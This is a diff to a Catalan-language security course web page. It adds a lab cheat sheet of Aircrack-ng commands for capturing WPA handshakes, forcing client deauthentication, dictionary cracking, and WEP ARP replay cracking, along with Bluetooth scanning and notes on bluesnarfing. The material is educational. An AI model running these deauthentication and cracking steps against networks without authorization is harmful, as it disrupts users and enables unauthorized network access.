@@ -184,6 +184,48 @@
         <img src="images/image10.png" alt="Packetforge">
         <p>Podem trobar un document que descriu i demostra aquest tipus d’atac a: <a href="http://download.aircrack-ng.org/wiki-files/doc/Fragmentation-Attack-in-Practice.pdf" target="_blank">Fragmentation-Attack-in-Practice.pdf</a>.</p>
       </section>
+      <!-- SECCIÓ PRÀCTICA / LABORATORI -->
+      <section class="card" id="laboratori" style="border-left: 4px solid var(--accent-3);">
+        <h2 style="color:var(--accent-3); margin-top:0;">🔬 Part Pràctica — Laboratori (Cheat Sheet)</h2>
+        <p>Resum de comandes essencials per a l'auditoria de xarxes amb la suite <strong>Aircrack-ng</strong>.</p>
+
+        <h3>Captura de Handshake i atac de diccionari (WPA/WPA2)</h3>
+        <ol>
+          <li>Activa mode monitor:
+            <pre><code>airmon-ng start wlan0</code></pre>
+          </li>
+          <li>Localitza l'AP (Escaneig):
+            <pre><code>airodump-ng wlan0mon</code></pre>
+          </li>
+          <li>Fixa canal i captura (Sniffing):
+            <pre><code>airodump-ng -c [CANAL] --bssid [MAC_AP] -w captura wlan0mon</code></pre>
+          </li>
+          <li>(Opcional) Força desconnexions (Deauth):
+            <pre><code>aireplay-ng -0 4 -a [MAC_AP] -c [MAC_CLIENT] wlan0mon</code></pre>
+          </li>
+          <li>Prova diccionari (Cracking):
+            <pre><code>aircrack-ng -w wordlist.txt captura.cap</code></pre>
+          </li>
+        </ol>
+
+        <h3>Accelerar IVs i crack WEP</h3>
+        <ol>
+          <li>Mode monitor i sniffing amb <code>airodump-ng</code>.</li>
+          <li>Injecta ARP per generar trànsit (Replay Attack):
+            <pre><code>aireplay-ng -3 -b [BSSID] -h [MAC_TEVA] wlan0mon</code></pre>
+          </li>
+          <li>Quan hi hagi prou IVs, executa:
+            <pre><code>aircrack-ng captura.cap</code></pre>
+          </li>
+        </ol>
+
+        <h3>Bluetooth — Bluejacking vs Bluesnarfing</h3>
+        <ul>
+          <li>Escaneja dispositius: <code>hcitool scan</code>, <code>bluetoothctl</code>.</li>
+          <li><strong>Bluejacking:</strong> enviament de vCards; prova amb dispositius en mode discoverable.</li>
+          <li><strong>Bluesnarfing:</strong> accés no autoritzat a dades (⚠️ no executar en entorns productius sense permís).</li>
+        </ul>
+      </section>
 
       <!-- 1.11 Pràctica (Quiz) -->
       <section class="card" id="s1-11">
